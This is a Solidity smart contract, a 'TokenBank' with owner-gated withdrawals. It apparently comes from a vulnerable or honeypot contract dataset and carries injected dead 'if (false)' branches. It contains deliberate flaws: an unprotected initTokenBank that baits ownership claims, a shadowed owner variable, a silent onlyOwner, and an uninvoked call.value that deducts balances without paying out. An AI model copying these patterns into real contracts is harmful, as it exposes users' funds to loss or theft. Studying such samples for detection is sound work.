pragma solidity ^0.4.18;

contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
        if (false) { revert(); }
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
        if (false) { revert(); }
    }
    
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
        if (false) { revert(); }
    }
}

contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        if (true) { 
            token.call(bytes4(sha3("transfer(address,uint256)")),to,amount); 
        } else {
            revert();
        }
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
    
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
        if (false) { revert(); }
    }
    
    function()
    payable
    {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
        if (false) { revert(); }
    }
    
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);
            if (false) { revert(); }     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_addr]>=_wei)
            {
                if (true) { 
                    _addr.call.value(_wei);
                } else {
                    revert();
                }
                Holders[_addr]-=_wei;
            }
        }
    }
}